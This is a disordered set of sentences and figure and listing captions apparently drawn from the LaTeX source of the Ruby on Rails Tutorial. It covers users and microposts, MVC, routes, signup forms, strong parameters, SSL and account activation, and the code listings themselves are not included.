 There's an additional complication, though: we want to \emph{associate} each micropost with a particular user. We'll accomplish this by recording the \kode{user\_id} of the owner of the post.
The data model for microposts.
We'll see in Section~\ref{sec:demo_user_has_many_microposts} (and more fully in Chapter~\ref{cha:user_microposts}) how this \kode{user\_id} attribute allows us to succinctly express the notion that a user potentially has many associated microposts.
By including \kode{name:string} and \kode{email:string}, we have arranged for the User model to have the form shown in Figure~\ref{fig:demo_user_model}.
As we proceed, it may help to refer to Table~\ref{table:user_urls}, which shows the correspondence between pages and URLs.
The correspondence between pages and URLs for the Users resource.
We start with the page to show all the users in our application, called \href{http://localhost:3000/users}{\texttt{index}}; as you might expect, initially there are no users at all (Figure~\ref{fig:demo_blank_user_index_rails_3}).
The initial index page for the Users resource (\href{http://localhost:3000/users}{/users}).
To make a new user, we visit the \href{http://localhost:3000/users/new}{\texttt{new}} page, as shown in Figure~\ref{fig:demo_new_user_rails_3}.
The new user page (\href{http://localhost:3000/users/new}{/users/new}).
The result is the user \href{http://localhost:3000/users/1}{\texttt{show}} page, as seen in Figure~\ref{fig:demo_show_user_rails_3}.
(The green welcome message is accomplished using the \emph{flash}, which we'll learn about in Section~\ref{sec:the_flash}.)
Note that the URL is \href{http://localhost:3000/users/1}{/users/1}; as you might suspect, the number~\kode{1} is simply the user's~\kode{id} attribute from Figure~\ref{fig:demo_user_model}.
The page to show a user (\href{http://localhost:3000/users/1}{/users/1}).
To change a user's information, we visit the \href{http://localhost:3000/users/1/edit}{\texttt{edit}} page (Figure~\ref{fig:demo_edit_user_rails_3}).
By modifying the user information and clicking the Update User button, we arrange to change the information for the user in the toy application (Figure~\ref{fig:demo_update_user_rails_3}).
(As we'll see in detail starting in Chapter~\ref{cha:modeling_users}, this user data is stored in a database back-end.)
The user edit page (\href{http://localhost:3000/users/1/edit}{/users/1/edit}).
A user with updated information.
The user index page (\href{http://localhost:3000/users}{/users}) with a second user.
Having shown how to create, show, and edit users, we come finally to destroying them (Figure~\ref{fig:demo_destroy_user}).
You should verify that clicking on the link in Figure~\ref{fig:demo_destroy_user} destroys the second user, yielding an index page with only one user.
Destroying a user.
Our strategy will be to describe the results of a typical browser hit---a visit to the user index page at \href{http://localhost:3000/users}{/users}---in terms of MVC (Figure~\ref{fig:mvc_detailed}).
A detailed diagram of MVC in Rails.
We start with a request issued from the browser---i.e., the result of typing a URL in the address bar or clicking on a link (Step~1 in Figure~\ref{fig:mvc_detailed}).
The code to create the mapping of user URLs to controller actions for the Users resource appears in Listing~\ref{code:rails_routes}; this code effectively sets up the table of URL/action pairs seen in Table~\ref{table:user_urls}.
The Rails routes, with a rule for the Users resource.
Adding a root route for users.
The Users controller in schematic form.
<n>  end
Note from Table~\ref{table:demo_RESTful_users} that there is some overlap in the URLs; for example, both the user \kode{show} action and the \kode{update} action correspond to the URL /users/1.
RESTful routes provided by the Users resource in Listing~\ref{code:rails_routes}.
To examine the relationship between the Users controller and the User model, let's focus on a simplified version of the \kode{index} action, shown in Listing~\ref{code:demo_index_action}.
The simplified user \kode{index} action for the toy application.
This \kode{index} action has the line \kode{@users = User.all} (Step~3 in Figure~\ref{fig:mvc_detailed}), which asks the User model to retrieve a list of all the users from the database (Step~4), and then places them in the  variable \kode{@users} (pronounced ``at-users'') (Step~5).
The User model itself appears in Listing~\ref{code:demo_user_model}; although it is rather plain, it comes equipped with a large amount of functionality because of inheritance (Section~\ref{sec:inheritance_hierarchies} and Section~\ref{sec:ruby_classes}).
In particular, by using the Rails library called \emph{Active Record}, the code in Listing~\ref{code:demo_user_model} arranges for \kode{User.all} to return all the users in the database.
The User model for the toy application.
Once the \kode{@users} variable is defined, the controller calls the \emph{view} (Step~6), shown in Listing~\ref{code:demo_index_view}.
The view for the user index.
As with the Users resource, we'll generate scaffold code for the Microposts resource using \kode{rails generate scaffold}, in this case implementing the data model from Figure~\ref{fig:demo_micropost_model}
as seen in Listing~\ref{code:demo_microposts_resource}.
The scaffold code may have extra newlines compared to Listing~\ref{code:demo_microposts_resource}.
The Rails routes, with a new rule for Microposts resources.
RESTful routes provided by the Microposts resource in Listing~\ref{code:demo_microposts_resource}.
The Microposts controller itself appears in schematic form Listing~\ref{code:demo_microposts_controller}.
The Microposts controller in schematic form.
To make some actual microposts, we enter information at the new microposts page, \href{http://localhost:3000/microposts/new}{/microposts/new}, as seen in Figure~\ref{fig:demo_new_micropost}.
The new micropost page (\href{http://localhost:3000/microposts/new}{/microposts/new}).
At this point, go ahead and create a micropost or two, taking care to make sure that at least one has a \kode{user\_id} of~\kode{1} to match the id of the first user created in Section~\ref{sec:a_user_tour}.
The result should look something like Figure~\ref{fig:demo_micropost_index}.
The micropost index page (\href{http://localhost:3000/microposts}{/microposts}).
Constraining microposts to be at most 140 characters.
The code in Listing~\ref{code:demo_length_validation} may look rather mysterious---we'll cover validations more thoroughly starting in Section~\ref{sec:user_validations}---but its effects are readily apparent if we go to the new micropost page and enter more than 140 characters for the content of the post.
As seen in Figure~\ref{fig:micropost_length_error}, Rails renders \emph{error messages} indicating that the micropost's content is too long.
Error messages for a failed micropost creation.
We can express this in code by updating the User and Micropost models as in Listing~\ref{code:demo_user_has_many_microposts} and Listing~\ref{code:demo_micropost_belongs_to_user}.
A user has many microposts.
A micropost belongs to a user.
We can visualize the result of this association in Figure~\ref{fig:micropost_user_association}.
Because of the \kode{user\_id} column in the \kode{microposts} table, Rails (using Active Record) can infer the microposts associated with each user.
The association between microposts and users.
In Chapter~\ref{cha:user_microposts} and Chapter~\ref{cha:following_users}, we will use the association of users and microposts both to display all of a user's microposts and to construct a Twitter-like micropost feed.
We first invoke the console with \kode{rails console} at the command line, and then retrieve the first user from the database using \kode{User.first} (putting the results in the variable \kode{first\_user})
With this code, Active Record automatically returns all the microposts with \kode{user\_id} equal to the id of \kode{first\_user} (in this case,~\kode{1}).
Comparing  Listing~\ref{code:demo_user_class} and Listing~\ref{code:demo_micropost_class}, we see that both the User model and the Micropost model inherit (via the left angle bracket~\kode{<}) from \kode{ActiveRecord::Base}, which is the base class for models provided by ActiveRecord; a diagram summarizing this relationship appears in Figure~\ref{fig:demo_model_inheritance}.
The \kode{User} class, highlighting inheritance.
The \kode{Micropost} class, highlighting inheritance.
The inheritance hierarchy for the User and Micropost models.
Comparing Listing~\ref{code:demo_users_controller_class} and Listing~\ref{code:demo_microposts_controller_class}, we see that both the Users controller and the Microposts controller inherit from the Application controller.
Examining Listing~\ref{code:toy_application_controller_class}, we see that \kode{ApplicationController} itself inherits from \kode{ActionController::Base}; this is the base class for controllers provided by the Rails library Action Pack.
The relationships between these classes is illustrated in Figure~\ref{fig:demo_controller_inheritance}.
The \kode{UsersController} class, highlighting inheritance.
The \kode{MicropostsController} class, highlighting inheritance.
The \kode{ApplicationController} class, highlighting inheritance.
The inheritance hierarchy for the Users and Microposts controllers.
 Since all Rails controllers inherit from \kode{ApplicationController}, rules defined in the Application controller automatically apply to every action in the application.
Update Listing~\ref{code:toy_user_presence_valications} by replacing \kode{FILL\_IN} with the appropriate code to validate the presence of name and email attributes in the User model (Figure~\ref{fig:user_presence_validations}).
In this chapter, we will complete the REST actions for the Users resource (Table~\ref{table:RESTful_users}) by adding \kode{edit}, \kode{update}, \kode{index}, and \kode{destroy} actions.
We'll start by giving users the ability to update their profiles, which will also provide a natural opportunity to enforce an authorization model (made possible by the authentication code in Chapter~\ref{cha:log_in_log_out}).
The pattern for editing user information closely parallels that for creating new users (Chapter~\ref{cha:sign_up}).
<n>    end
The corresponding user edit view (which you will have to create by hand) is shown in Listing~\ref{code:user_edit_view}.
In Chapter~\ref{cha:updating_showing_and_deleting_users}, we finished making a basic Users resource (filling in all the standard REST actions from Table~\ref{table:RESTful_users}), together with a flexible authentication and authorization system.
At present, newly registered users immediately have full access to their accounts (Chapter~\ref{cha:sign_up}).
We'll define the generalized version of the \kode{authenticated?}\ method from Table~\ref{table:password_token_digest} in Section~\ref{sec:activating_the_account}.
(This will require a modification of the \kode{authenticated?}\ method defined in Listing~\ref{code:authenticated_p}.)
as shown in Listing~\ref{code:add_activation_to_users_migration}.
This code simply reuses the token and digest methods used for the remember token, as we can see by comparing with the \kode{remember} method from Listing~\ref{code:user_model_remember}:
As a result of the callback, when a new user is defined with \kode{User.new} (as in user signup, Listing~\ref{code:create_action_strong_parameters}), it will automatically get both \kode{activation\_token} and \kode{activation\_digest} attributes; because the latter is associated with a column in the database (Figure~\ref{fig:user_model_account_activation}), it will be written automatically when the user is saved.
With the \kode{@user} instance variable as defined in Listing~\ref{code:mail_account_activation}, we can create the necessary links using the named edit route and embedded Ruby, as shown in Listing~\ref{code:account_activation_view_text} and Listing~\ref{code:account_activation_view_html}.
After restarting the development server to activate the configuration in Listing~\ref{code:development_email_settings}, we next need to update the User mailer \emph{preview file}, which was automatically generated in Section~\ref{sec:account_activation_mailer}, as shown in Listing~\ref{code:generated_user_mailer_previews}.
Because the \kode{account\_activation} method defined in Listing~\ref{code:mail_account_activation} requires a valid user object as an argument, the code in Listing~\ref{code:generated_user_mailer_previews} won't work as written.
Recall from the discussion in Section~\ref{sec:account_activation_mailer} that the activation token and email are available as \kode{params[:id]} and \kode{params[:email]}, respectively.
Listing~\ref{code:signup_with_account_activation_test} also uses the \kode{assigns} method for the first time in the main tutorial; as explained in the Chapter~\ref{cha:log_in_log_out} exercise (Section~\ref{sec:log_in_out_exercises}), \kode{assigns} lets us access instance variables in the corresponding action.
To define the \kode{update} action corresponding to the \kode{edit} action in Listing~\ref{code:password_reset_edit_action}, we need to consider four cases: an expired password reset, a successful update, a failed update (due to an invalid password), and a failed update (which initially looks ``successful'') due to a blank password and confirmation.
That \emph{is} what we want, and it leads to the \kode{password\_reset\_expired?}\ method in Listing~\ref{code:user_model_password_reset_expired}.
With the code in Listing~\ref{code:user_model_password_reset_expired}, the \kode{update} action in Listing~\ref{code:password_reset_update_action} should be working.
To configure our application to use SendGrid, we need to fill out the \href{https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol}{SMTP} settings for our production environment.
The rest of the \emph{Ruby on Rails Tutorial} builds on this foundation to make a site with Twitter-like microposts (Chapter~\ref{cha:user_microposts}) and a status feed of posts from followed users (Chapter~\ref{cha:following_users}).
Action
A mockup of the sample application's Home page.
In preparation for adding users to our site in Chapter~\ref{cha:sign_up}, the first \kode{link\_to} creates a stub link of the form
The second \kode{link\_to} shows off the \kode{image\_tag} helper, which takes as arguments the path to an image and an optional options hash, in this case setting the \kode{alt} attribute of the image tag using symbols.
as shown in Listing~\ref{code:curl_rails_png}.
Because we used the \kode{image\_tag} helper in Listing~\ref{code:signup_button}, Rails will automatically find any images in the \kode{app/assets/images/} directory using the asset pipeline (Section~\ref{sec:sass_and_the_asset_pipeline}).
To make the effects of \kode{image\_tag} clearer, let's look at the HTML it produces
Our first step is to add Bootstrap, which in Rails applications can be accomplished with the \texttt{bootstrap-sass} gem, as shown in Listing~\ref{code:bootstrap_sass}.
(This uses the \kode{touch} trick from Section~\ref{sec:green} en route, but you can create the file however you like.)
Inside the file for the custom CSS, we can use the \kode{@import} function to include Bootstrap (together with the associated Sprockets utility), as shown in Listing~\ref{code:bootstrap_css}
After restarting the web server to incorporate the changes into the development application (by pressing Ctrl-C and then running \kode{rails server} as in Section~\ref{sec:rails_server}), the results appear as in Figure~\ref{fig:sample_app_only_bootstrap}.
Adding some spacing and other universal styling.
In other words, the dot \kode{.}\ in \kode{.center} indicates that the rule styles a class.
The sample app with nicely styled logo.
(We'll create the \kode{shared} directory starting in Chapter~\ref{cha:sign_up}.)
The Home page with an added footer.
<n> *= require_tree .
<n> *= require_self
<n>*= require_tree .
<n>*= require_self
This way the code has a more transparent meaning, and it's also more flexible since we can change the definition of \kode{about\_path} and have the URL change everywhere \kode{about\_path} is used.
(We'll make the last one in Chapter~\ref{cha:log_in_log_out}.)
Route and URL mapping for site links.
For completeness, we'll add the Contact page, which was left as an exercise in Chapter~\ref{cha:static_pages}.
A test for the Contact page. 
Defining the root route in this way has a second important effect, which is to create named routes that allow us to refer to routes by a name rather than by the raw URL. In this case, these routes are \kode{root\_path} and \kode{root\_url}, with the only difference being that the latter includes the full URL:
In the \emph{Rails Tutorial}, we'll follow the common convention of using the \kode{\_path} form except when doing redirects, where we'll use the \kode{\_url} form.
As with the rule for the root route, this creates two named routes, \kode{help\_path} and \kode{help\_url}:
This simply involves filling in the second arguments of the \kode{link\_to} functions with the proper named routes.
With that, our layout has links to all the static pages created in Chapter~\ref{cha:static_pages}, so that, for example, \href{http://localhost:3000/about}{/about} goes to the About page (Figure~\ref{fig:about_page}).
The About page at \href{http://localhost:3000/about}{/about}.
We can get started by generating a template test, which we'll call \kode{site\_layout}:
Note that the Rails generator automatically appends \kode{\_test} to the name of the test file.
Listing~\ref{code:layout_links_test} shows how we can use Rails integration tests to translate these steps into code, beginning with the \kode{assert\_template} method to verify that the Home page is rendered using the correct view
Listing~\ref{code:layout_links_test} uses some of the more advanced options of the \kode{assert\_select} method, seen before in Listing~\ref{code:title_tests} and Listing~\ref{code:contact_page_test}.
Here Rails automatically inserts the value of \kode{about\_path} in place of the question mark (escaping any special characters if necessary), thereby checking for an HTML tag of the form
Some more uses of \kode{assert\_select} appear in Table~\ref{table:assert_select}.
Some uses of \kode{assert\_select}.
If all went well, you should run the full test suite to verify that all the tests are \passing:
This is a first important step toward allowing users to register for our site; we'll take the next step, modeling users, in Chapter~\ref{cha:modeling_users}, and we'll finish the job in Chapter~\ref{cha:sign_up}.
A test for the new user page. 
As with the other routes, \kode{get 'signup'} automatically gives us the named route \kode{signup\_path}, which we put to use in Listing~\ref{code:home_page_signup_link}.
With that, we're done with the links and named routes, at least until we add a route for logging in (Chapter~\ref{cha:log_in_log_out}).
The new signup page at \href{http://localhost:3000/signup}{/signup}.
It's convenient to use the \kode{full\_title} helper in the tests by including the Application helper into the test helper, as shown in Listing~\ref{code:test_helper_application_helper}.
Fix this problem by writing a direct test of the \kode{full\_title} helper, which involves creating a file to test the application helper and then filling in the code indicated with \kode{FILL\_IN} in Listing~\ref{code:full_title_helper_tests}.
(Listing~\ref{code:full_title_helper_tests} uses \kode{assert\_equal <expected>, <actual>}, which verifies that the expected result \linebreak matches the actual value when compared with the \kode{==} operator.)
Using the \kode{full\_title} helper in a test. 
The \emph{Ruby on Rails Tutorial} takes an integrated approach to web development by building three example applications of increasing sophistication, starting with a minimal \emph{hello} app (Section~\ref{sec:the_hello_application}), a slightly more capable \emph{toy} app (Chapter~\ref{cha:a_toy_app}), and a real \emph{sample} app (Chapter~\ref{cha:static_pages} through Chapter~\ref{cha:following_users}).
We'll then create our first Rails application, called \kode{hello\_app}.
And, believe it or not, in this chapter we'll even put our first app on the wider web by \emph{deploying} it to production (Section~\ref{sec:deploying}).
In Chapter~\ref{cha:a_toy_app}, we'll make a second project, whose purpose is to demonstrate the basic workings of a Rails application.
The rest of the tutorial focuses on developing a single large \emph{real sample application} (called \kode{sample\_app}), writing all the code from scratch.
We'll develop the sample app using a combination of \emph{mockups}, \emph{test-driven development} (TDD), and \emph{integration tests}.
We'll get started in Chapter~\ref{cha:static_pages} by creating static pages and then add a little dynamic content.
We'll take a quick detour in Chapter~\ref{cha:rails_flavored_ruby} to learn a little about the Ruby language underlying Rails.
Then, in Chapter~\ref{cha:filling_in_the_layout} through Chapter~\ref{cha:account_activation_and_password_reset}, we'll complete the foundation for the sample application by making a site layout, a user data model, and a full registration and authentication system (including account activation and password resets).
In the \emph{Ruby on Rails Tutorial}, we'll take the (nearly) polar opposite approach: although Chapter~\ref{cha:a_toy_app} will develop a small toy app using scaffolding, the core of the \emph{Rails Tutorial} is the sample app, which we'll start writing in Chapter~\ref{cha:static_pages}.
For simplicity, all command line examples use a Unix-style command line prompt (a dollar sign), as follows:
If, despite the challenges involved, you would still prefer to complete the \emph{Ruby on Rails Tutorial} using a local development environment, I recommend following the instructions at \href{http://installrails.com/}{InstallRails.com}
As shown in Figure~\ref{fig:cloud9_new_workspace}, create a workspace called ``rails-tutorial'' (\emph{not} ``rails\_tutorial''), set it to ``Private to the people I invite'', and select the icon for the Rails Tutorial (\emph{not} the icon for Ruby on Rails)
To get started, users \emph{not} using the Cloud9 IDE recommended in Section~\ref{sec:development_environment} should make a \kode{workspace} directory for your Rails projects if it doesn't already exist (Listing~\ref{code:mkdir_rails_projects}) and then change into the directory.
As seen at the end of Listing~\ref{code:rails_command}, running \kode{rails new} automatically runs the \kode{bundle install} command after the file creation is done.
This standard directory and file structure (Figure~\ref{fig:directory_structure_rails}) is one of the many advantages of Rails; it immediately gets you from zero to a functional (if minimal) application.
A summary of the default Rails files appears in Table~\ref{table:rails_directory_structure}; we'll learn about most of these files and directories throughout the rest of this book.
The directory structure for a newly created Rails app.
A summary of the default Rails directory structure.
(The code in this file is Ruby, but don't worry at this point about the syntax; Chapter~\ref{cha:rails_flavored_ruby} will cover Ruby in more depth.)
The default \kode{Gemfile} in the \kode{hello\_app} directory.
Thanks to running \kode{rails new} in Section~\ref{sec:the_hello_application} and \kode{bundle install} in Section~\ref{sec:bundler}, we already have an application we can run---but how?
Even at this early stage, it's helpful to get a high-level overview of how Rails applications work (Figure~\ref{fig:MVC}).
You might have noticed that the standard Rails application structure (Figure~\ref{fig:directory_structure_rails}) has an application directory called \kode{app/} with three subdirectories: \kode{models}, \kode{views}, and \kode{controllers}.
A schematic representation of the model-view-controller (MVC) architecture.
(We'll start creating our own controllers in Chapter~\ref{cha:a_toy_app}.)
(Don't worry about the Ruby syntax right now; it will be covered in more depth in Chapter~\ref{cha:rails_flavored_ruby}.)
Adding a \kode{hello} action to the Application controller.
To activate the root route, uncomment this line by removing the hash character and then replace it with the code in Listing~\ref{code:hello_root_route}, which tells Rails to send the root route to the \kode{hello} action in the Application controller.
Setting the root route.
Although we'll never need to edit it in the main tutorial, an example of adding a rule to the \kode{.gitignore} file appears in Section~\ref{sec:guard}, which is part of the optional advanced testing setup in Section~\ref{sec:advanced_testing_setup}.
(If you set up the \kode{co} alias in Section~\ref{sec:version_control}, you can use \kode{git co -b modify-README} instead.)
Then fill \kode{README.md} with the contents of Listing~\ref{code:new_readme}.
The improved \kode{README} file formatted with Markdown.
To prepare the system for deployment to production, we run \kode{bundle install} with a special flag to prevent the local installation of any production gems (which in this case consists of~\texttt{pg} and \texttt{rails\_12factor}):
The first step is to \href{http://signup.heroku.com/}{sign up for Heroku}.
To see your newly deployed application, visit the address that you saw when you ran \kode{heroku create} (i.e., Listing~\ref{code:heroku_create}).
In the next chapter, we'll build on the foundation from Chapter~\ref{cha:beginning} to make a database-backed \emph{toy app}, which will give us our first real taste of what Rails can do.
Change the content of the \kode{hello} action in Listing~\ref{code:hello_action} to read ``hola, mundo!''
\emph{Extra credit}: Show that Rails supports non-\href{http://es.wikipedia.org/wiki/ASCII}{ASCII} characters by including an inverted exclamation point, as in ``¡Hola, mundo!''
By following the example of the \kode{hello} action in Listing~\ref{code:hello_action}, add a second action called \kode{goodbye} that renders the text ``goodbye, world!''.
 We first saw microposts in larval form in Chapter~\ref{cha:a_toy_app}, and in this chapter we will make a full-strength version of the sketch from Section~\ref{sec:microposts_resource} by constructing the Micropost data model, associating it with the User model using the \kode{has\_many} and \kode{belongs\_to} methods, and then making the forms and partials needed to manipulate and display the results (including, in Section~\ref{sec:micropost_images}, uploaded images).
In Chapter~\ref{cha:following_users}, we'll complete our tiny Twitter clone by adding the notion of \emph{following} users in order to receive a \emph{feed} of their microposts.
Even though the content will be restricted to fewer than 140 characters (Section~\ref{sec:micropost_validations}) and hence would fit inside the 255-character \kode{string} type, using \kode{text} better expresses the nature of microposts, which are more naturally thought of as blocks of text.
The model tests should now be \passing:
The first of these was included automatically by the migration in Listing~\ref{code:micropost_migration} via \kode{belongs\_to :user}, as shown in Listing~\ref{code:micropost_belongs_to_user}.
Of course, after this minor refactoring the test suite should still be \passing:
Because the application code was working, the test suite should be \passing:
In this section, we'll also see the first hint of a \emph{status feed}---a notion brought to full fruition in Chapter~\ref{cha:following_users}.
In Chapter~\ref{cha:sign_up}, we implemented user signup by making an HTML form that issued an HTTP \texttt{POST} request to the \kode{create} action in the Users controller.
At this point, all the tests should be \passing:
The result of adding these additional checks appears in Listing~\ref{code:jquery_file_test}.
We'll learn how to model such user relationships, and see the implications for the microposts feed, in Chapter~\ref{cha:following_users}.
We'll use an HTML \emph{form} to submit user signup information to our application (Section~\ref{sec:signup_form}), which will then be used to create a new user and save its attributes to the database (Section~\ref{sec:successful_signups}).
In this chapter, we'll rely on the User model validations from Chapter~\ref{cha:modeling_users} to increase the odds of new users having valid email addresses.
In Chapter~\ref{cha:account_activation_and_password_reset}, we'll make \emph{sure} of email validity by adding a separate \emph{account activation} step to user signup.
Our eventual goal for the user profile pages is to show the user's profile image, basic user data, and a list of microposts, as mocked up in Figure~\ref{fig:profile_mockup}
We'll complete this task, and with it the sample application, in Chapter~\ref{cha:following_users}.
A mockup of the user profile made in this section.
A mockup of our best guess at the final profile page.
As you can see, Rails provides a \texttt{Rails} object with an \texttt{env} attribute and associated environment boolean methods, so that, for example, \texttt{Rails.env.test?}\ returns \texttt{true} in a test environment and \texttt{false} otherwise.
To make the debug output look nice, we'll add some rules to the custom stylesheet created in Chapter~\ref{cha:filling_in_the_layout}, as shown in Listing~\ref{code:mixin_and_debug}.
This introduces the Sass \emph{mixin} facility, in this case called \kode{box\_sizing}.
The sample application Home page with debug information.
The resulting correspondence of URLs, actions, and named routes is shown in Table~\ref{table:RESTful_users}.
RESTful routes provided by the Users resource in Listing~\ref{code:users_resource}.
The URL /users/1 with routing but no page.
in Listing~\ref{code:user_show_action} finds the user with id~\texttt{1}.
The user show page after adding a Users resource.
Our plan is to define a \kode{gravatar\_for} helper function to return a Gravatar image for a given user, as shown in Listing~\ref{code:user_show_view_with_gravatar}.
By default, methods defined in any helper file are automatically available in any view, but for convenience we'll put the \kode{gravatar\_for} method in the file for helpers associated with the Users controller.
(Because of the email downcasing callback in Listing~\ref{code:email_downcase}, this will never make a difference in this tutorial, but it's a good practice in case the \kode{gravatar\_for} ever gets used on email addresses from other sources.)
The resulting \kode{gravatar\_for} helper appears in  Listing~\ref{code:gravatar_for_helper}.
Defining a \kode{gravatar\_for} helper method.
The user profile page with the default Gravatar.
Listing~\ref{code:sidebar_css} includes the \kode{.gravatar\_edit} class, which we'll put to work in Chapter~\ref{cha:updating_showing_and_deleting_users}.
The current state of the signup page  \href{http://localhost:3000/signup}{/signup}.
A mockup of the user signup page.
We can accomplish this in Rails with the \kode{form\_for} helper method, which takes in an Active Record object and constructs a form using the object's attributes.
Recalling that the signup page /signup is routed to the \kode{new} action in the Users controller (Listing~\ref{code:signup_route}), our first step is to create the User object required as an argument to \kode{form\_for}.
(Note the reuse of the \kode{box\_sizing} mixin from Listing~\ref{code:mixin_and_debug}.)
We'll first look at the outer structure, which consists of embedded Ruby opening with a call to \kode{form\_for} and closing with \kode{end}:
The presence of the \kode{do} keyword indicates that \kode{form\_for} takes a block with one variable, which we've called \kode{f} (for ``form'').
A filled-in form with \kode{text} and \kode{password} fields.
See \href{http://stackoverflow.com/questions/941594/understand-rails-authenticity-token}{the Stack Overflow entry on the Rails authenticity token} if you're interested in the details of how this works.
A mockup of the signup failure page.
This listing includes a second use of the \kode{render} method, which we first saw in the context of partials (Section~\ref{sec:partials}); as you can see, \kode{render} works in controller actions as well.
Signup failure.
Signup failure debug information.
This hash gets passed to the Users controller as part of \kode{params}, and we saw starting in Section~\ref{sec:a_users_resource} that the \kode{params} hash contains information about each request. In the case of a URL like /users/1, the value of \kode{params[:id]} is the \kode{id} of the corresponding user (\kode{1}~in this example).
Previous versions of Rails used a method called \kode{attr\_accessible} in the \emph{model} layer to solve this problem, and you may still see that method in legacy Rails applications, but as of Rails~4.0 the preferred technique is to use so-called \emph{strong parameters} in the controller layer.
To facilitate the use of these parameters, it's conventional to introduce an auxiliary method called \kode{user\_params} (which returns an appropriate initialization hash) and use it in place of \kode{params[:user]}:
Since \kode{user\_params} will only be used internally by the Users controller and need not be exposed to external users via the web, we'll make it \emph{private} using Ruby's \kode{private} keyword, as shown in Listing~\ref{code:create_action_strong_parameters}.
By the way, the extra level of indentation on the \kode{user\_params} method is designed to make it visually apparent which methods are defined after \kode{private}.
Here the \kode{errors.full\_messages} object (which we saw briefly before in Section~\ref{sec:presence_validation}) contains an array of error messages.
To display the messages in the browser, we'll render an error-messages partial on the user \kode{new} page while adding the CSS class \kode{form-control} (which has special meaning to Bootstrap) to each entry field, as shown in Listing~\ref{code:f_error_messages}.
Notice here that we \kode{render} a partial called \kode{'shared/error\_messages'}; this reflects the common Rails convention of using a dedicated \kode{shared/} directory for partials expected to be used in views across multiple controllers.
We see here that the \kode{empty?}\ method, which we first saw in Section~\ref{sec:objects_and_message_passing} in the context of strings, also works on Rails error objects, returning \kode{true} for an empty object and \kode{false} otherwise.
In addition, after an invalid submission Rails automatically wraps the fields with errors in \kode{div}s with the CSS class \kode{field\_with\_errors}.
Because the messages are generated by the model validations, they will automatically change if you ever change your mind about, say, the format of email addresses, or the minimum length of passwords.
Failed signup with error messages.
To get started, we first generate an integration test file for signing up users, which we'll call \kode{users\_signup} (adopting the controller convention of a plural resource name):
Here \kode{User.count} is \kode{0} because we reset the database at the beginning of Section~\ref{sec:signup_form}.
As in Section~\ref{sec:layout_link_tests}, we'll use \kode{assert\_select} to test HTML elements of the relevant pages, taking care to check only elements unlikely to change in the future.
In order to test the form submission, we need to issue a \texttt{POST} request to the \kode{users\_path} (Table~\ref{table:RESTful_users}), which we can do with the \kode{post} function:
Although the two are equivalent, using \kode{assert\_no\_difference} is cleaner and is more idiomatically correct Ruby.
We've also included a call to \kode{assert\_template} to check that a failed submission re-renders the \kode{new} action.
A test for an invalid signup. 
A mockup of successful signup.
The application code, which introduces the \kode{redirect\_to} method, appears in Listing~\ref{code:user_create_action}.
This is because Rails automatically infers from \kode{redirect\_to @user} that we want to redirect to \kode{user\_url(@user)}.
(If instead you get an error message indicating that the email address has already been taken, be sure to run the \kode{db:migrate:reset} Rake task as indicated in Section~\ref{sec:signup_form} and restart the development webserver.)
The results of a successful user signup, with flash message.
The flash-less profile page after a browser reload.
here we'll use the corresponding \kode{assert\_difference} method:
Incorporating \kode{assert\_difference} into the file from Listing~\ref{code:a_test_for_invalid_submission} yields the test shown in Listing~\ref{code:a_test_for_valid_submission}.
Note that we've used the \kode{post\_via\_redirect} variant to post to the users path.
A test for a valid signup. 
Although we started deploying our application in Chapter~\ref{cha:static_pages}, this is the first time it will actually \emph{do} something, so we'll take this opportunity to make the deployment professional-grade.
Although we could use SSL on just the signup page, it's actually easier to implement it site-wide, which has the additional benefits of securing user login (Chapter~\ref{cha:log_in_log_out}) and making our application immune to a critical \emph{session hijacking} vulnerability discussed in Section~\ref{sec:remember_me}.
As shown in Listing~\ref{code:ssl_in_production}, all we need to do is set the \kode{config} variable to force the use of SSL in production.
In Chapter~\ref{cha:log_in_log_out}, we will complete our authentication machinery by allowing users to log in and out of the application.
In Chapter~\ref{cha:updating_showing_and_deleting_users}, we will allow all users to update their account information, and we will allow site administrators to delete users, thereby completing the full suite of Users resource REST actions from Table~\ref{table:RESTful_users}.
The \kode{form\_for} helper is used to make forms for interacting with Active Record objects.
Verify that the code in Listing~\ref{code:gravatar_option} allows the \kode{gravatar\_for} helper defined in Section~\ref{sec:a_gravatar_image} to take an optional \kode{size} parameter, allowing code like \kode{gravatar\_for user, size: 50} in the view.
How detailed you want to make your tests is up to you; a suggested ultra-minimalist template appears in Listing~\ref{code:flash_test}, which you should complete by replacing \kode{FILL\_IN} with the appropriate code.
Verify by running the test suite that the cleaner code in Listing~\ref{code:layout_flash_content_tag}, which uses the Rails \kode{content\_tag} helper, also works.
Adding an options hash in the \kode{gravatar\_for} helper.
The \kode{flash} ERb in the site layout using \kode{content\_tag}.
A direct test the \kode{full\_title} helper.
Checking for this requires the use of the ``not'' operator (Section~\ref{sec:objects_and_message_passing}), written using an exclamation point~\kode{!}\ and usually read as ``bang''.
in Listing~\ref{code:real_user_fixture}.
By filling in the missing elements in Listing~\ref{code:login_create_user_instance} and Listing~\ref{code:improved_remember_me_test} (indicated with question marks~\kode{?}\ and \kode{FILL\_IN}), complete this improved test of the ``remember me'' checkbox.
In Chapter~\ref{cha:filling_in_the_layout}, we ended with a stub page for creating new users (Section~\ref{sec:user_signup}).
In Chapter~\ref{cha:sign_up}, we'll give users the ability to sign up for our site and create a user profile page.
Once users can sign up, we'll let them log in and log out as well (Chapter~\ref{cha:log_in_log_out}), and in Chapter~\ref{cha:updating_showing_and_deleting_users} (Section~\ref{sec:requiring_logged_in_users}) we'll learn how to protect pages from improper access.
Finally, in Chapter~\ref{cha:account_activation_and_password_reset} we'll add account activation (thereby confirming a valid email address) and password resets.
Taken together, the material in Chapter~\ref{cha:modeling_users} through Chapter~\ref{cha:account_activation_and_password_reset} develops a full Rails login and authentication system.
By using an email address as the username, we open  the possibility of communicating with our users at a future date (Chapter~\ref{cha:account_activation_and_password_reset}).
In Listing~\ref{code:example_user}, we did this with Ruby's \kode{attr\_accessor} method:
One of the results of the \kode{generate} command in Listing~\ref{code:generate_user_model} is a new file called a \emph{migration}.
In the case of the User model, the migration is created automatically by the model generation script; it creates a \kode{users} table with two columns, \kode{name} and \kode{email}, as shown in Listing~\ref{code:users_migration}.
In the case of Listing~\ref{code:users_migration}, \kode{change} uses a Rails method called \kode{create\_table} to create a table in the database for storing users.
The \kode{create\_table} method accepts a block (Section~\ref{sec:blocks}) with one block variable, in this case called \kode{t} (for ``table'').
The User data model produced by Listing~\ref{code:users_migration}.
Under the hood, this command executes the \kode{drop\_table} command to remove the users table from the database.
